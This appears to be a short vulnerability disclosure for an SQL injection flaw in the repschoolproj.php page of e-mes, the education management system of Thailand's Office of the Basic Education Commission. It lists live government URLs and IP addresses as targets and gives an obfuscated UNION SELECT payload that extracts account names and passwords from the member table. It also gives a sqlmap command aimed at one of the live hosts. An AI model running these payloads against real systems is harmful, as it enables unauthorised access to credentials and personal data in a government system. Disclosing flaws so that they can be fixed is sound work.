Describe：
E-mes is an education management system of Thailand's basic education department. It has a serious SQL injection vulnerability, through which many sensitive information in the database can be obtained. This affects the whole e-mes version. As this is a system of the Thai government department, it can't be found on GitHub for the time being

`Attack Vectors`
> A SQL injection vulnerability exists in the school information query interface (repschoolproj.php) of the EMS system of the Office of the Thai Basic Education Commission, which can lead to important data leakage.This website is owned by the Thai government, and if it is not repaired in time, it may lead to information leakage.

`POC:` 
> 1.http://eme1.obec.go.th/~eme62/repschoolproj.php?claster=school&idarea=648
> 2.http://203.159.250.192/~eme52/repschoolproj.php?claster=school&idarea=648
> 3.http://203.159.250.194/~eme53/repschoolproj.php?claster=school&idarea=648
> 4.http://203.159.164.54/~eme54/repschoolproj.php?claster=school&idarea=648
> 5.http://203.159.250.193/~eme63/repschoolproj.php?claster=school&idarea=648
> 6.more.....
> Exploit:
> http://localhost/eme/repschoolproj.php?claster=school&idarea=648 repschoolproj.php?claster=school&idarea=648 /**/uNiOn /**/select/**/ 1,1,user,1,1,1,1,1,2,3,4,5,6,7,1,1,9,10,passwd,12,13,1,1,1,1,user(),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from member#
> This exp can get the login account and password of the e-mes system
> photo proof:
![图片](https://user-images.githubusercontent.com/110643835/188271608-f84fa56c-e571-4bad-977d-1f3758c20f6f.png)
![图片](https://user-images.githubusercontent.com/110643835/188271644-c6d1d05c-09ec-4785-9507-0809d0c48e22.png)

Or use sqlmap for injection
> POC: sqlmap.py -u "http://203.159.164.54/~eme54/repschoolproj.php?claster=school&idarea=648*"

